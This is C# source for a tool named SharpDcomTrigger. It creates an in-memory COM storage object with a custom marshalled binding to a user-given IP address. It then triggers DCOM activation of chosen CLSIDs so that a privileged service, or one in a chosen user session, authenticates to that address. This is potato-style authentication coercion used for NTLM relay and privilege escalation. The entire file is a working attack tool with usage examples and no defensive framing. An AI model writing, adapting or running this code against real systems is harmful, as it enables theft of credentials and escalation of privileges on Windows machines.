using Microsoft.Win32;
using SharpDcomTrigger.Com;
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Threading;

namespace SharpDcomTrigger
{
    class Program
    {

        [Guid("0000033C-0000-0000-c000-000000000046")]
        [ComImport]
        private class StandardActivator
        {
        }

        
        // Run here to ensure it's called before the main thread.
        private static readonly Ole32.SOLE_AUTHENTICATION_SERVICE[] svcs = new Ole32.SOLE_AUTHENTICATION_SERVICE[] {
            new Ole32.SOLE_AUTHENTICATION_SERVICE() {
                dwAuthnSvc = 5,
            }
        };
        private static readonly int _security_init = Ole32.CoInitializeSecurity(IntPtr.Zero, -1, IntPtr.Zero, IntPtr.Zero,
            Ole32.AuthnLevel.RPC_C_AUTHN_LEVEL_DEFAULT, Ole32.ImpLevel.RPC_C_IMP_LEVEL_IMPERSONATE, IntPtr.Zero,
                Ole32.EOLE_AUTHENTICATION_CAPABILITIES.EOAC_DYNAMIC_CLOAKING, IntPtr.Zero);


        public static int TriggerSystem(string clsid, string binding)
        {

            int result = 0;
            Guid clsId_guid = new Guid(clsid);

            try
            {
                //Create IStorage object
                result = Ole32.CreateILockBytesOnHGlobal(IntPtr.Zero, true, out ILockBytes lockBytes);
                result = Ole32.StgCreateDocfileOnILockBytes(lockBytes, Ole32.STGM.CREATE | Ole32.STGM.READWRITE | Ole32.STGM.SHARE_EXCLUSIVE, 0, out IStorage storage);

                //Initialze IStorageTrigger object
                StorageTrigger storageTrigger = new StorageTrigger(storage, binding, TowerProtocol.EPM_PROTOCOL_TCP);

                Ole32.MULTI_QI[] qis = new Ole32.MULTI_QI[1];
                qis[0].pIID = Ole32.IID_IUnknownPtr;
                qis[0].pItf = null;
                qis[0].hr = 0;

                result = Ole32.CoGetInstanceFromIStorage(null, ref clsId_guid, null, Ole32.CLSCTX.CLSCTX_LOCAL_SERVER, storageTrigger, 1, qis);

            }
            catch (Exception e)
            {
                //Console.WriteLine(e);
            }

            return 0;
        }

        public static int TriggerSession(string clsid, string binding, int session_id = -1)
        {
            Guid clsId_guid = new Guid(clsid);
            IStorage stg;
            ILockBytes lb;
            int result;

            try
            {
                //Initialze IStorage object
                result = Ole32.CreateILockBytesOnHGlobal(IntPtr.Zero, true, out lb);
                result = Ole32.StgCreateDocfileOnILockBytes(lb, Ole32.STGM.CREATE | Ole32.STGM.READWRITE | Ole32.STGM.SHARE_EXCLUSIVE, 0, out stg);
                //Console.WriteLine("std: {0}", stg);

                //Initialze IStorageTrigger object
                StorageTrigger storageTrigger = new StorageTrigger(stg, binding, TowerProtocol.EPM_PROTOCOL_TCP);

                //Guid clsid = new Guid("{0bae55fc-479f-45c2-972e-e951be72c0c1}");
                //Guid clsid = new Guid("{4991d34b-80a1-4291-83b6-3328366b9097}");
                //Guid clsid = new Guid("{5167B42F-C111-47A1-ACC4-8EABE61B0B54}");
                Guid tmp = new Guid("{00000000-0000-0000-C000-000000000046}");
                Guid CLSID_ComActivator = new Guid("{0000033C-0000-0000-c000-000000000046}");
                Guid IID_IStandardActivator = typeof(IStandardActivator).GUID;

                Ole32.MULTI_QI[] qis = new Ole32.MULTI_QI[1];
                qis[0].pIID = Ole32.IID_IUnknownPtr;
                qis[0].pItf = null;
                qis[0].hr = 0;
                var pComAct = (IStandardActivator)new StandardActivator();
                uint result2 = Ole32.CoCreateInstance(ref CLSID_ComActivator, null, 0x1, ref IID_IStandardActivator, out object instance);
                Console.WriteLine("[*] CoCreateInstance: {0}", (Ole32.CoCreateReturn)result2);
                pComAct = (IStandardActivator)instance;

                if (session_id != -1)
                {
                    ISpecialSystemPropertiesActivator props = (ISpecialSystemPropertiesActivator)pComAct;
                    Console.WriteLine("[*] Spawning in session {0}", session_id);
                    props.SetSessionId(session_id, 0, 1);
                }

                result = pComAct.StandardGetInstanceFromIStorage(null, clsId_guid, IntPtr.Zero, CLSCTX.LOCAL_SERVER, storageTrigger, 1, qis);
                Console.WriteLine("[*] StandardGetInstanceFromIStoragee: {0}", result);
            }
            catch (Exception e)
            {
                //Console.WriteLine(e);
            }
            return 0;
        }


        [STAThread]
        static void Main(string[] args) {
            int port = 0;
            int session;
            string binding;
            string target;
            string clsid = "{4991d34b-80a1-4291-83b6-3328366b9097}";

            if (args.Length < 1)
            {
                Console.WriteLine("usage: SharpDcomTrigger.exe <Target IP> <clsid> <session>");
                Console.WriteLine("usage: SharpDcomTrigger.exe 192.168.1.10 \"{4991d34b-80a1-4291-83b6-3328366b9097}\"");
                Console.WriteLine("usage: SharpDcomTrigger.exe 192.168.1.10 \"{5167B42F-C111-47A1-ACC4-8EABE61B0B54}\" 1");
                return;
            }
            else
            {
                target = args[0];
            }

            if (args.Length >= 2)
            {
                clsid = args[1];
            }

            if (port > 0)
                binding = String.Format("{0}[{1}]", target, port);
            else
                binding = target;

            if (args.Length >= 3)
            {
                session = int.Parse(args[2]);
                TriggerSession(clsid, binding, session);
            }
            else
            {
                TriggerSystem(clsid, binding);
            }
        }
    }
}
